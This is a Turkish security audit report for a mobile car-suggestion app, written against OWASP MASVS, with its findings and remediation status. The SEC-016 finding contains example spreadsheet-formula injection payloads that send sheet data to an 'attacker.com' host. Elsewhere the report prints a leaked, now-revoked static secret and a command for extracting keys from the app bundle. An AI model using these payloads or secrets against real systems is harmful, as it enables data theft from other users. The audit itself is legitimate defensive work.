# SECURITY-AUDIT.md — OtoHead

Tarih: 2026-09-22 | Metodoloji: OWASP MASVS v2 / MASTG | Kapsam: `C:\mobile` (statik analiz;
build çıktısı/APK üzerinde doğrulama bu ortamda yapılamadı — bkz. her bulgunun "Doğrulama" satırı)

## Executive Summary

**Durum (2026-09-22, P1 tamamlandı):** Raporun açıldığı gündeki 5 maddelik "en kötü senaryo"
listesinin **tamamı artık çözüldü**. Aşağıdaki liste orijinal bulguları (denetimin başlangıç
durumu) belgelemek için korunuyor; her maddenin güncel durumu yanında işaretli.

1. ~~Apps Script backend'inin tüm yetkilendirmesi, uygulama bundle'ına gömülü TEK ve SABİT bir
   `secretKey` string'ine dayanıyordu~~ → **✅ ÇÖZÜLDÜ.** Artık her cihaz kendi `clientId`'sine
   özel, sunucu tarafında üretilen bir `secret` alıyor (register akışı); statik anahtar
   tamamen kaldırıldı ve canlıda doğrulandı (eski sızmış anahtarla istek artık reddediliyor).
2. ~~`backend/.env` (Gemini API anahtarı, JWT imzalama anahtarı) GitHub'a commit'lenmiş ve
   halen git tarafından izleniyordu~~ → **✅ ÇÖZÜLDÜ.** Git geçmişinden tamamen temizlendi,
   JWT_SECRET/ADMIN_KEY rotate edildi, Gemini desteği tamamen kaldırıldığı için o anahtar
   artık hiç kullanılmıyor.
3. ~~Gemini API proxy'si kimlik doğrulama ve rate limit olmadan çalışıyordu~~ → **✅ ÇÖZÜLDÜ.**
   Kullanıcı kararıyla AI desteği uygulamadan tamamen kaldırıldı, route silindi.
4. ~~Yerel SQLite veritabanı şifresiz ve Android manifest'inde `allowBackup="true"`
   duruyordu~~ → **✅ ÇÖZÜLDÜ (allowBackup).** `app.config.ts`'e taşındı, native proje
   yeniden üretildi, manifest'te artık `allowBackup="false"`. Veritabanı şifrelemesi (SQLCipher)
   hâlâ P2/backlog'da — bkz. SEC-008.
5. **iOS tarafı bu ortamda hâlâ denetlenemedi** (`/ios` klasörü diskte yok) — ATS, TLS pinning,
   pasteboard/ekran görüntüsü koruması gibi konular hâlâ NEEDS-MANUAL-REVIEW.

Genel değerlendirme: Uygulamanın client-side mimarisi (yerel SQLite, sunucuya fotoğraf
yüklememe, AI anahtarının client'a hiç inmemesi) baştan beri isabetli kararlar içeriyordu.
Asıl risk — yetkilendirmenin paylaşımlı bir client-side string'e dayanması ve iki backend'in
secret hijyeninin zayıf olması — artık kapandı. Kalan açık maddeler (iOS denetimi, SQLite
şifreleme, runtime koruma) MVP aşaması için zorunlu değil, bkz. REMEDIATION-PLAN.md P2.

## Uygulanan P0 Aksiyonları (2026-09-22)

| Madde | Durum | Not |
|---|---|---|
| JWT_SECRET rotasyonu | ✅ | Yeni 256-bit değer `backend/.env`'de |
| ADMIN_KEY rotasyonu | ✅ | Yeni 256-bit değer `backend/.env`'de |
| GEMINI_API_KEY rotasyonu | ✅ (farklı yoldan çözüldü) | Anahtar rotate edilmedi ama **tüm AI desteği uygulamadan kaldırıldı** — `ai.routes.ts`, `GEMINI_API_KEY`, `openai` bağımlılığı silindi. SEC-006 artık geçersiz (route yok). Eski anahtar Google tarafında hâlâ geçerli olabilir — kullanılmadığı için risk düşük, yine de https://aistudio.google.com/apikey üzerinden silinmesi önerilir |
| `backend/.env` + `data/*.db*` git geçmişinden temizlendi | ✅ | `git filter-branch` ile tüm commit'lerden silindi, `git fsck --full --strict` ile doğrulandı |
| Temizlenmiş geçmiş `origin/main`'e force-push edildi | ✅ | `git push --force-with-lease` başarılı |
| Root `.gitignore`'a `.env` eklendi | ✅ | Gelecekte `git init` sonrası aynı hata tekrarlanmaz |
| Apps Script kaynağı incelendi (SEC-005) | ✅ | SEC-001 doğrulandı, SEC-016/SEC-017 yeni bulgular olarak eklendi |
| Gemini AI desteği tamamen kaldırıldı | ✅ | `backend/src/routes/ai.routes.ts` silindi, `server.ts`/`src/config/api.ts` güncellendi, `openai` bağımlılığı kaldırıldı — SEC-006 kapandı |
| `backend/node_modules` git geçmişinden temizlendi | ✅ | Aynı `.gitignore`-zaten-tracked hatası (bkz. SEC-010/SEC-002) — `git filter-branch` ile temizlendi, `.git` boyutu 76M → 213K, force-push edildi |

**Önemli not — veri kurtarma olayı:** Git geçmişi temizliği sırasında bir stash yanlışlıkla
geri yüklenmeden temizlendi ve `backend/src/server.ts`, `backend/src/config/database.ts`,
`backend/src/models/suggestion.model.ts`, `backend/src/routes/suggestions.routes.ts`
dosyalarındaki commit'lenmemiş değişiklikler VS Code'un yerel dosya geçmişinden kurtarılarak
diske geri yazıldı. Git tarafında kalıcı kayıp riski oluşmuştu; kurtarma sonrası içerik
denetimin başındaki orijinal haliyle karşılaştırılıp doğrulandı. Kullanıcının bu dosyaları
editöründe tekrar gözden geçirmesi önerilir.

**GEMINI_API_KEY hâlâ sızmış (eski) değerinde duruyor** — `backend/.env:3`'teki yorum
satırında rotasyon talimatı bırakılmıştı, ancak AI desteği tamamen kaldırıldığı için (bkz.
altta) bu anahtar artık hiçbir yerde kullanılmıyor. SEC-002 bu yüzden çözüldü sayılıyor;
yine de Google tarafında iptal edilmesi ek güvence olarak önerilir.

## Uygulanan P1 Aksiyonları (2026-09-22)

| Madde | İlgili | Durum | Not |
|---|---|---|---|
| Admin endpoint'leri sertleştirildi | SEC-003 | ✅ | `!==` yerine SHA-256 + `crypto.timingSafeEqual`, `express-rate-limit` (15dk'da 20 deneme) eklendi |
| `clientId` kripto-güvenli RNG'ye taşındı | SEC-004 | ✅ | `Math.random()` → `uuid` v4 + `react-native-get-random-values` polyfill |
| `allowBackup: false` gerçek build'e yansıtıldı | SEC-007 | ✅ | `app.config.ts`'e taşındı, `expo prebuild --platform android --clean` ile native proje yeniden üretildi. Bonus: paket adı `com.anonymous.mobile` → `com.emrullah4.arabamcepte` düzeldi (eski/stale prebuild) |
| `app.json` / `app.config.ts` çakışması giderildi | SEC-014 | ✅ | İki dosyanın birleşimi `app.config.ts`'e taşındı (scheme, icon, permissions, plugins dahil — app.json'da olup app.config.ts'de eksik olan bir dizi ayar vardı), `app.json` silindi |
| Bağımlılık taraması ve temizliği | SEC-012 | ✅ | `npm audit fix`: root 35→20 (kalanlar Expo tooling transitive, `--force` gerektiriyor, native build riski var, uygulanmadı), backend 4→0. Kullanılmayan `axios` (root) ve `mssql` + yanlışlıkla eklenmiş RN paketleri (backend) kaldırıldı |
| Dev-only local API adresi koddan çıkarıldı | SEC-009 | ✅ | `src/config/api.ts` artık hardcoded LAN IP yerine `EXPO_PUBLIC_API_IP`'den okuyor; tanımsızsa özellik sessizce devre dışı kalıyor (cleartext IP prod bundle'ına gömülmüyor) |
| Sheets formula/CSV injection sanitizasyonu | SEC-016 | ✅ | Apps Script'e `sanitizeCell_()` eklendi, tüm kullanıcı girdisi alanlarına uygulandı |
| Apps Script hata mesajları generic'leştirildi | SEC-017 | ✅ | `err.message` yerine `Logger.log` + `'Sunucu hatası.'` |
| **Paylaşımlı statik `secretKey` kaldırıldı** | SEC-001 | ✅ | Bkz. aşağıdaki detaylı bölüm — P1'in en kritik maddesi |

### SEC-001 kalıcı çözümü — cihaza özel kimlik bilgisi modeli

Statik `secretKey`'i timing-safe hale getirmek (orijinal planda "HMAC imzalı istek" olarak
geçen fikir) **gerçek bir güvenlik kazanımı sağlamazdı** — client'a gömülü herhangi bir
imzalama anahtarı da aynı şekilde çıkarılabilir. Bunun yerine mimari değişti:

- Apps Script'e yeni bir `register` aksiyonu eklendi: cihaz kendi (zaten cihazda üretilen,
  kripto-güvenli) `clientId`'sini gönderiyor, Apps Script o `clientId`'ye özel rastgele bir
  `secret` üretip **hash'ini** yeni bir "Clients" sheet'inde saklıyor, düz secret'ı yalnızca
  bir kereliğine cihaza dönüyor.
- Cihaz bu secret'ı yerel SQLite'da saklıyor (`client_config` tablosu), bir daha register
  çağırmıyor. Tüm sonraki istekler `(clientId, secret)` çiftiyle doğrulanıyor.
- Aynı `clientId` için ikinci bir `register` çağrısı reddediliyor (replay/squat koruması);
  `register`'a global bir hız sınırı da eklendi (CacheService, dakikada 30 kayıt).
- **Mevcut kullanıcılar etkilenmiyor:** clientId'leri (ve varsa bekleyen Sheets kayıtları)
  aynı kalıyor, sadece bir sonraki açılışta otomatik olarak kendi secret'larını alıyorlar.

**Canlıda doğrulandı (2026-09-22):**
```
1) POST action=register, yeni clientId  → {"success":true,"clientId":"...","secret":"..."}
2) GET  action=check, doğru (clientId,secret)   → {"success":true,"status":"YOK"}
3) GET  action=check, YANLIŞ secret (aynı clientId) → {"success":false,"error":"Yetkisiz istek."}
4) GET  action=check, ESKİ sızmış secretKey (arabamcepte2024gizli) → {"success":false,"error":"Yetkisiz istek."}
```
4. numaralı test, raporun açılış cümlesindeki senaryonun (sızmış anahtarla herkesin verisine
erişim) artık mümkün olmadığını kanıtlıyor.

**Değiştirilen dosyalar:** `src/services/database.ts` (secret saklama), `src/services/suggestionApi.ts`
(register akışı + tüm çağrılarda `secret` kullanımı), `.env` (`EXPO_PUBLIC_SCRIPT_KEY` satırı
kaldırıldı), Apps Script kaynağı (kullanıcı tarafından deploy edildi).

---

## Bulgu Tablosu

| ID | Başlık | Severity | Konum | MASVS/MASTG | Durum |
|---|---|---|---|---|---|
| SEC-001 | Apps Script backend'i tek, statik, bundle'a gömülü `secretKey` ile "korunuyor" — **Apps Script kaynağıyla CONFIRMED** | **Critical** | `.env:4`, `src/services/suggestionApi.ts`, Apps Script `doPost/doGet` | MASVS-AUTH-1, MASTG-TEST-0015 | **Çözüldü** — cihaza özel `register`/`secret` modeline geçildi, canlıda doğrulandı |
| SEC-002 | `backend/.env` (Gemini key + JWT secret) GitHub reposuna commit'lenmiş, halen tracked | **Critical** | `backend/.env`, `backend/.git` history | MASVS-STORAGE-1, MASTG-TEST-0014 | **Çözüldü** — git geçmişinden temizlendi, JWT_SECRET/ADMIN_KEY rotate edildi, Gemini key artık kullanılmıyor |
| SEC-003 | Admin endpoint'leri zayıf, statik `ADMIN_KEY` + non-constant-time karşılaştırma ile korunuyor | High | `backend/.env:5`, `backend/src/routes/suggestions.routes.ts:46,62` | MASVS-AUTH-1 | **Çözüldü** — SHA-256+timingSafeEqual, rate limit eklendi |
| SEC-004 | `clientId` `Math.random()` ile üretiliyor (kriptografik değil), tek "kimlik" bu | Medium | `src/services/database.ts:98-104` | MASVS-CRYPTO-4 | **Çözüldü** — `uuid` v4 + `react-native-get-random-values` |
| SEC-005 | Google Apps Script sunucu tarafı kodu incelendi — **SEC-001'i doğruluyor, ek bulgu SEC-016'yı ortaya çıkardı** | High | Apps Script (`doPost`, `doGet`, `findRowByClientId`) | MASVS-AUTH, MASVS-CODE | **Çözüldü (CONFIRMED)** |
| SEC-006 | `/api/ai` (Gemini proxy) kimlik doğrulama ve rate limit olmadan çalışıyor | High | `backend/src/routes/ai.routes.ts` | MASVS-AUTH-1, MASVS-RESILIENCE | **Çözüldü** — route tamamen silindi, AI desteği kaldırıldı |
| SEC-018 | `backend/node_modules` git'e tracked (aynı `.gitignore`-zaten-tracked hatası) | Low (hijyen) | `backend/.git` history | — | **Çözüldü** — `git filter-branch` ile temizlendi, `.git` 76M→213K |
| SEC-007 | `AndroidManifest.xml`: `allowBackup="true"`, app.json'daki `false` ile çelişiyor (stale prebuild) | Medium | `android/app/src/main/AndroidManifest.xml:17` vs `app.json:26` | MASVS-STORAGE-8 | **Çözüldü** — `app.config.ts`'e taşındı, prebuild yenilendi |
| SEC-008 | Yerel SQLite veritabanı şifresiz (expo-sqlite, SQLCipher yok) | Medium | `src/services/database.ts` | MASVS-STORAGE-1 | Açık (P2 — allowBackup kapandığı için pratik risk düştü) |
| SEC-009 | Cleartext HTTP (`http://`) ile local API'ye istek atılıyor | Medium | `src/config/api.ts:4`, `.env:1-2` | MASVS-NETWORK-1 | **Çözüldü** — env'den okunuyor, tanımsızsa özellik devre dışı |
| SEC-010 | `backend/data/arabamcepte.db*` (uygulama veritabanı) git'e tracked | Low-Medium | `backend/data/` | MASVS-STORAGE-1 | **Çözüldü** — tracking'den çıkarıldı |
| SEC-011 | Ana proje (`C:\mobile`) hiç git repository değil | Low (süreç) | `C:\mobile` | — | **Çözüldü** — yerel `git init` + ilk commit yapıldı (`.env`/`node_modules`/`android`/`backend` doğrulanarak hariç tutuldu). Remote eklenmedi, kullanıcı kararı |
| SEC-012 | 35 (root) + 14 (backend) bilinen bağımlılık zafiyeti, çoğu build-tooling ama 1'er critical | Low-Medium | `package-lock.json` her ikisi | MASVS-CODE-9 | **Kısmen çözüldü** — root 35→20 (kalan `--force`/breaking gerektiriyor), backend 4→0 |
| SEC-013 | iOS platform sertleştirmesi denetlenemedi (`/ios` yok) | — | — | MASVS-PLATFORM | NEEDS-MANUAL-REVIEW |
| SEC-014 | `app.json` ve `app.config.ts` aynı anda mevcut, ayarlar tutarsız/çatallı | Low | `app.json`, `app.config.ts` | — | **Çözüldü** — birleştirildi, `app.json` silindi |
| SEC-015 | Kullanılmayan/gereksiz Android izinleri (RECORD_AUDIO, SYSTEM_ALERT_WINDOW) kod içinde referans bulunamadı | Low | `AndroidManifest.xml:6-7` | MASVS-PLATFORM-1 | **Çözüldü** — kaynak paketler kaldırıldı, `blockedPermissions` eklendi |
| SEC-016 | Google Sheets'e formula/CSV injection — kullanıcı girdisi (`description`, `budget`, `message`, ...) sanitize edilmeden `appendRow` ile hücreye yazılıyor | High | Apps Script `handleSubmit`, `handleEvalSubmit` | MASVS-CODE-4 (OWASP CSV Injection) | **Çözüldü** — `sanitizeCell_()` eklendi |
| SEC-017 | Apps Script `catch` blokları `err.message`'ı doğrudan client'a döndürüyor (bilgi sızıntısı) | Low | Apps Script `doPost`/`doGet` catch blokları | MASVS-CODE | **Çözüldü** — generic mesaj + `Logger.log` |

---

## Detay Bloklar

### [SEC-001] Apps Script backend'i statik, bundle'a gömülü secretKey ile "korunuyor"
Severity: **Critical** | MASVS-AUTH-1

**Konum:** `.env:4` (`EXPO_PUBLIC_SCRIPT_KEY`), kullanım: `src/services/suggestionApi.ts:1-2, 44-91`

**Kanıt:**
```
.env:4  → EXPO_PUBLIC_SCRIPT_KEY=arab****…****gizli (20 char)
suggestionApi.ts:2 → const SECRET_KEY = process.env.EXPO_PUBLIC_SCRIPT_KEY ?? '';
```
`EXPO_PUBLIC_*` önekli her değer, Metro bundler tarafından derleme anında JS bundle'ına
literal string olarak inline edilir (Expo'nun resmi davranışı). Yani bu anahtar hem Android
hem iOS build'inde düz metin olarak durur; `strings index.android.bundle | grep gizli`
komutuyla saniyeler içinde çıkarılır. Bu, `EXPO_PUBLIC_API_IP`/`PORT` gibi zaten public olması
tasarım gereği olan değerlerden **farklı** bir kategoridir: bu anahtar bir yetkilendirme sırrı
olarak kullanılıyor (`submitSuggestion`, `submitEvaluation`, `checkEvaluation`,
`checkSuggestion`, `markAsSeen` — hepsi `secretKey`'i body/query'de Apps Script'e gönderiyor).

**Saldırı senaryosu:**
1. Saldırgan APK/IPA'yı indirir, JS bundle'ını `strings`/`jadx` ile açar, `secretKey`'i çıkarır.
2. Bu anahtar TÜM kullanıcılar için aynı (kullanıcıya özgü değil) → saldırgan:
   - `submitSuggestion`/`submitEvaluation` ile Google Sheets'e sınırsız sahte kayıt yazabilir
     (spam/veri kirliliği, potansiyel Sheets hücre/formül enjeksiyonu — bkz. SEC-005),
   - rastgele/sıralı `clientId` değerleri deneyerek `checkSuggestion`/`checkEvaluation` ile
     başka kullanıcıların bütçe, yıl aralığı, açıklama gibi verilerini okuyabilir (IDOR).
3. Anahtar rotate edilse bile yeni build dağıtılana kadar eski kullanıcılarda aynı zafiyet sürer.

**Düzeltme:** Faz 1.5'teki mimari zorunluluk burada da geçerli — paylaşılan statik secret
yerine, backend'in (Apps Script veya bir proxy) kullanıcı bazlı, süresi dolan, sunucu
tarafında doğrulanan bir erişim modeli olmalı. Asgari düzeltme: Apps Script `doPost/doGet`
içinde `clientId` başına rate limit + `secretKey` yerine anonim ama imzalı bir token (HMAC,
cihazda üretilip sunucuda `clientId`'ye bağlı sırla doğrulanan) kullanmak. İdeal düzeltme:
Apps Script önüne kimlik doğrulamalı bir proxy koymak (Faz 1.5 şablonu).

**Doğrulama:** `expo export` sonrası `strings dist/_expo/static/js/*.hbc | grep -i gizli`
çıktısı boş dönmeli (ya da anahtar bundle'a hiç girmemeli).

**Kırılma riski:** Mevcut tüm kullanıcı build'leri eski (sızmış) anahtarla çalışmaya devam
eder — geçiş için Apps Script'te hem eski hem yeni doğrulama şemasını bir süre paralel
desteklemek gerekir.

**CONFIRMED (Apps Script kaynağı incelendi, 2026-09-22):** Kullanıcının paylaştığı `.gs`
kaynağı bu bulguyu birebir doğruluyor:
```js
const SECRET_KEY = 'arabamcepte2024gizli';   // .env:4 ile birebir aynı değer
if (data.secretKey !== SECRET_KEY) { return response({ success:false, error:'Yetkisiz istek.' }); }
```
- Karşılaştırma `!==` ile yapılıyor (non-constant-time — teorik timing attack, network jitter
  nedeniyle pratik sömürü zorluğu yüksek, düşük öncelik).
- `findRowByClientId(sheet, clientId)` tüm satırları tarayıp **yalnızca `clientId` eşleşmesine**
  bakıyor — `secretKey` doğru olduğu sürece **herhangi bir `clientId` ile herhangi bir
  kullanıcının kaydı okunabiliyor** (`handleCheck`, `handleSimpleCheck`, `handleMarkSeen`).
  Bu, SEC-001'in "IDOR" senaryosunu teorikten **doğrulanmış/kanıtlanmış** duruma taşır.
- Web app'in deploy ayarı ("Execute as" / "Who has access") kod dışı bir ayardır ve bu
  incelemede görülemedi, ama mobil client OAuth olmadan doğrudan `fetch()` ile çağırdığına
  göre **"Anyone, even anonymous"** olarak deploy edilmiş olmalı — yani `secretKey` internetteki
  herkese açık tek koruma katmanı.

**Ek düzeltme (Apps Script tarafı):** `data.secretKey !== SECRET_KEY` karşılaştırmasını
`Utilities.computeHmacSha256Signature` tabanlı bir HMAC doğrulamasıyla değiştir (Faz 1.5
önerisi); `findRowByClientId`'yi yalnızca `clientId` değil, `clientId` + cihaza özgü bir
HMAC imzasıyla eşleştir.

---

### [SEC-002] `backend/.env` GitHub'a commit'lenmiş, secret'lar halen izleniyor
Severity: **Critical** | MASVS-STORAGE-1

**Konum:** `backend/.env` (git tracked), commit `c3838c36` (initial commit) ve `8dd733bc`
(security improvements — ironik biçimde secret'ı temizlemiyor, sadece bir IP değerini değiştiriyor).

**Kanıt:**
```
$ git -C backend ls-files | grep -i env  →  .env  (tracked)
$ git -C backend show HEAD:.env
GEMINI_API_KEY=AQ.A****…****OerA (53 char)
EXPO_PUBLIC_API_IP=192.168.1.123
EXPO_PUBLIC_API_PORT=3000
JWT_SECRET=arab****…****K9mP (40 char)
$ git -C backend remote -v
origin  https://github.com/emrullahbasar/arabamcepte-backend.git
```
Repo, `origin/main`'den 1 commit ileride (henüz push edilmemiş) — yani en azından
`initial commit`'teki `.env` içeriği GitHub'a zaten gönderilmiş olabilir (doğrulanmalı:
`git -C backend log origin/main -- .env`). Unauthenticated GitHub API sorgusu 404 döndü,
bu repo private olabileceğine işaret ediyor ama **kesin değil** — private/public durumu
GitHub hesabından teyit edilmeli.

**Saldırı senaryosu:** Repo herhangi bir noktada public olursa, bir işbirlikçiyle paylaşılırsa,
ya da bu makinenin/hesabın erişimi ele geçirilirse, `GEMINI_API_KEY` ve `JWT_SECRET` anında
sızmış olur. `JWT_SECRET` sızarsa saldırgan **herhangi bir kullanıcı için geçerli 30 günlük
JWT üretebilir** (`generateToken`, `expiresIn: '30d'`) — tam hesap ele geçirme.

**Düzeltme:**
1. `GEMINI_API_KEY` ve `JWT_SECRET`'ı rotate et (Google AI Studio / kendi secret store).
2. `git filter-repo` veya BFG ile `.env` dosyasını **tüm** git geçmişinden temizle,
   force-push et (ekip/klonlar bilgilendirilmeli).
3. `git rm --cached .env` ile mevcut index'ten de çıkar (gitignore zaten var, yeterli değildi
   çünkü dosya önceden tracked'dı).

**Doğrulama:** `git -C backend ls-files | grep -i '^\.env$'` boş dönmeli;
`git -C backend log --all -- .env` hiç commit göstermemeli (history temizliği sonrası).

**Kırılma riski:** Force-push + history rewrite, repoyu klonlamış olan herkesin yeniden
klonlaması gerektirir; CI/CD varsa yeniden yapılandırma gerekebilir (şu an CI tespit edilmedi).

---

### [SEC-003] Admin endpoint'leri zayıf statik anahtarla korunuyor
Severity: High | MASVS-AUTH-1

**Konum:** `backend/.env:5` (`ADMIN_KEY`, henüz commit'lenmemiş — çalışma kopyasında),
`backend/src/routes/suggestions.routes.ts:46` ve `:62`

**Kanıt:**
```ts
const adminKey = String(req.headers['x-admin-key'] ?? '');
if (adminKey !== process.env.ADMIN_KEY) { ... }   // non-constant-time compare
```
`ADMIN_KEY=arab****…****gizli` (28 char) — tahmin edilebilir bir kalıp (proje adı +
"admin" + yıl + "gizli"). `/api/suggestions/admin/all` tüm kullanıcı isteklerini
(push_token, bütçe, açıklama) döndürüyor; `/:id/answer` keyfi cevap yazıp push bildirimi
tetikleyebiliyor. Rate limit yok (user.routes.ts'deki `authLimiter` burada uygulanmamış).

**Saldırı senaryosu:** Anahtar brute-force edilir veya (SEC-002 gerçekleşirse) doğrudan
sızarsa, saldırgan tüm kullanıcıların öneri taleplerini okuyabilir ve sahte "cevap" push
bildirimleri gönderebilir.

**Düzeltme:** JWT tabanlı admin auth'a geçir (zaten `auth.middleware.ts` var, admin rolü
eklenip oraya taşınabilir), `authLimiter` benzeri bir rate limiter uygula, `crypto.timingSafeEqual`
ile sabit-zamanlı karşılaştırma kullan.

**Doğrulama:** Rate limit sonrası 11. denemede 429 dönmeli; anahtar karşılaştırması
`timingSafeEqual` ile yapılmalı.

**Kırılma riski:** Yok — bu endpoint şu an muhtemelen hiç kullanılmıyor (production
kullanım kanıtı bulunamadı).

---

### [SEC-004] `clientId` kriptografik olmayan RNG ile üretiliyor
Severity: Medium | MASVS-CRYPTO-4

**Konum:** `src/services/database.ts:98-104`
```ts
function generateUUID(): string {
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
    const r = (Math.random() * 16) | 0; ...
```
`Math.random()` kriptografik olarak güvenli değildir (V8/JSC'nin dahili PRNG state'i
teorik olarak tahmin edilebilir). Bu `clientId`, Apps Script'e karşı kullanıcının "kimliği"
olarak kullanılıyor (SEC-001 ile birleşince asıl risk büyüyor). `react-native-get-random-values`
zaten bağımlılıklarda var (`package.json:34`) ama burada **kullanılmamış** — `crypto.randomUUID()`
veya `uuid` paketi + bu polyfill'le kolayca düzeltilebilir.

**Düzeltme:** `import 'react-native-get-random-values'; import { v4 as uuidv4 } from 'uuid';`
zaten `backend`de `uuid` paketi kullanılıyor, aynısını client'a da ekle.

**Doğrulama:** Üretilen ID'lerin `crypto.getRandomValues` tabanlı kaynaktan geldiğini kod
incelemesiyle doğrula.

**Kırılma riski:** Mevcut kullanıcıların `clientId`'si değişmez (migration gerekmiyor, sadece
yeni kurulumlar için düzeltme).

---

### [SEC-016] Google Sheets formula/CSV injection
Severity: High | MASVS-CODE-4 (OWASP CSV/Formula Injection)

**Konum:** Apps Script `handleSubmit`, `handleEvalSubmit`

**Kanıt:**
```js
sheet.appendRow([
  requestId, data.clientId, data.budget, data.yearMin, data.yearMax,
  data.caseType || 'Belirtilmedi', data.fuel || 'Belirtilmedi',
  data.gear || 'Belirtilmedi', data.description || 'Belirtilmedi',
  now, 'BEKLİYOR', ''
]);
```
`data.description`, `data.budget`, `data.caseType`, `data.fuel`, `data.gear` — hepsi mobil
client'tan gelen serbest metin, **hiçbir sanitize işlemi olmadan** doğrudan hücreye yazılıyor.
Google Sheets (ve herhangi bir spreadsheet — Excel dahil), bir hücre `=`, `+`, `-` veya `@`
ile başlıyorsa onu formül olarak yorumlar.

**Saldırı senaryosu:** SEC-001'deki sızmış `secretKey` ile (veya normal bir kullanıcı arayüzü
üzerinden bile) `description` alanına `=HYPERLINK("http://attacker.com/"&A2;"tıkla")` veya
`=IMPORTXML("http://attacker.com/steal?d="&B2;"//a")` gibi bir formül gönderilirse:
- Sheet'i açan admin, tarayıcıda hücreye tıkladığında zararlı bir bağlantıya yönlendirilebilir,
  ya da formül otomatik hesaplanarak (`IMPORTXML`/`IMPORTDATA`) sheet içeriğini (diğer
  kullanıcıların bütçe/açıklama verileri dahil) saldırganın sunucusuna sızdırabilir.
- Sheet CSV/Excel olarak dışa aktarılıp yerel Excel'de açılırsa, klasik "CSV injection" /
  DDE saldırısı (uzak komut çalıştırma potansiyeli, eski Excel sürümlerinde) gündeme gelir.

**Düzeltme:** `appendRow`'dan önce her string alanı sanitize et — `=`, `+`, `-`, `@` ile
başlıyorsa başına `'` (tek tırnak) ekleyerek Sheets'in metin olarak yorumlamasını sağla:
```js
function sanitizeCell(v) {
  const s = String(v ?? '');
  return /^[=+\-@]/.test(s) ? "'" + s : s;
}
```
Tüm kullanıcı girdisi alanlarına (`budget`, `yearMin`, `yearMax`, `caseType`, `fuel`, `gear`,
`description`, `ilanNo`, `message`) uygula.

**Doğrulama:** `description: "=1+1"` gönder, Sheet hücresinde `'=1+1` (metin olarak) görülmeli,
hesaplanmış `2` değil.

**Kırılma riski:** Yok — yalnızca formülle başlayan girdiler etkilenir, normal metin aynı kalır.

---

### [SEC-017] Apps Script hata mesajları client'a sızdırılıyor
Severity: Low | MASVS-CODE

**Konum:** Apps Script `doPost`/`doGet` catch blokları — `return response({ success: false, error: err.message });`

İç implementasyon detayları (ör. `TypeError: Cannot read property 'getSheetByName' of null`)
doğrudan istemciye dönüyor. Düşük risk (Apps Script hata mesajları genelde kısa/generic) ama
sheet/kolon adları gibi iç yapı bilgisi sızabilir.

**Düzeltme:** Client'a generic bir mesaj dön (`'Sunucu hatası.'`), `err.message`'ı yalnızca
`Logger.log(err)` ile sunucu tarafı logla.

---

### [SEC-006] Gemini proxy kimlik doğrulama/rate limit olmadan çalışıyor
Severity: High | MASVS-AUTH-1, MASVS-RESILIENCE

**Konum:** `backend/src/routes/ai.routes.ts:13-49`

**Kanıt:** `router.post('/', async (req, res) => { const { message } = req.body; ... fetch(gemini...) })`
— `authMiddleware`, `rateLimit` uygulanmamış (kıyasla `user.routes.ts`'te `authLimiter` var).
Ayrıca `console.log('Gemini cevabı:', JSON.stringify(data))` (satır 42) — kullanıcı mesajına
verilen tam yanıtı (dolayısıyla dolaylı olarak kullanıcı girdisini) sunucu loglarına yazıyor.

**Saldırı senaryosu:** Bu Express sunucusu internete açılırsa (şu an `.env`'de LAN IP'si
olsa da kod `app.listen(PORT, '0.0.0.0', ...)` ile her arayüzü dinliyor), kimliksiz herkes
`GEMINI_API_KEY` faturasına sınırsız istek bindirebilir, ya da servisi DoS edebilir.

**Düzeltme:** Faz 1.5 proxy checklist'ini bu endpoint'e uygula: JWT doğrulama
(`authMiddleware` zaten mevcut, ekle), kullanıcı başına rate limit + günlük kota, girdi
boyutu limiti, prompt içeriğini PII sayıp loglama.

**Doğrulama:** Token'sız istek 401 dönmeli; 429 eşiği test edilmeli.

**Kırılma riski:** Client tarafında bu endpoint'e istek atan bir ekran görülmedi (kod
taramasında `api.ts`'deki `ai` endpoint'i tanımlı ama çağrıldığı yer bulunamadı) →
muhtemelen düşük kırılma riski, NEEDS-MANUAL-REVIEW (kullanılmıyorsa kaldırılması bile
düşünülebilir).

**ÇÖZÜLDÜ (2026-09-22):** Kullanıcı AI desteğini uygulamadan tamamen kaldırma kararı aldı.
`backend/src/routes/ai.routes.ts` silindi, `server.ts`'ten import/mount kaldırıldı,
`backend/.env`'den `GEMINI_API_KEY` silindi, `src/config/api.ts`'teki kullanılmayan `ai:`
endpoint tanımı kaldırıldı, `backend/package.json`'dan kullanılmayan `openai` bağımlılığı
çıkarıldı. `tsc --noEmit` ile derleme doğrulandı. Eski Gemini anahtarı rotate edilmedi ama
artık hiçbir yerde kullanılmıyor — yine de Google tarafında iptal edilmesi önerilir (bkz.
üstteki "Uygulanan P0 Aksiyonları" notu).

---

### [SEC-018] `backend/node_modules` git'e tracked
Severity: Low (hijyen, güvenlik etkisi yok) | —

**Konum:** `backend/.git` geçmişi (tüm commit'ler)

**Kanıt:** `.gitignore`'da `node_modules/` listeli olmasına rağmen (SEC-002/SEC-010'daki
aynı kök neden — dosyalar ignore eklenmeden önce zaten commit'lenmişti), `git ls-files`
binlerce `node_modules/*` yolu döndürüyordu. Güvenlik etkisi yok (içerik zaten public npm
paketleri) ama repo boyutunu şişiriyor, clone/fetch'i yavaşlatıyor, diff'leri gürültüye
boğuyor (`openai` bağımlılığını kaldırmak bile 26.000+ satırlık "D" diff üretti).

**ÇÖZÜLDÜ (2026-09-22):** `git rm -r --cached node_modules` + `git filter-branch` ile tüm
commit'lerden temizlendi, `refs/original` yedekleri silinip `git gc --prune=now --aggressive`
çalıştırıldı. `.git` dizini **76M → 213K**'ya indi. `git fsck --full --strict` temiz,
`git rev-list --objects --all` üzerinde `node_modules` eşleşmesi kalmadı. Temizlenmiş geçmiş
`origin/main`'e force-push edildi. Çalışma dizinindeki `node_modules` dosyaları etkilenmedi.

---

### [SEC-007] AndroidManifest `allowBackup="true"`, app.json ile çelişiyor
Severity: Medium | MASVS-STORAGE-8

**Konum:** `android/app/src/main/AndroidManifest.xml:17` (`allowBackup="true"`) vs.
`app.json:26` (`"allowBackup": false`)

**Kanıt:** `app.config.ts` (Expo'nun önceliklendirdiği config dosyası) içinde `allowBackup`
ayarı **hiç yok** — yani `app.json`'daki `false` değeri muhtemelen zaten etkisiz, ve diskteki
`android/` klasörü muhtemelen bu ayar eklenmeden önce `expo prebuild` ile üretilmiş, sonradan
güncellenmemiş.

**Saldırı senaryosu:** Cihaza fiziksel/ADB erişimi olan biri `adb backup` ile uygulama
verisini (şifresiz SQLite DB dahil) dışarı alabilir.

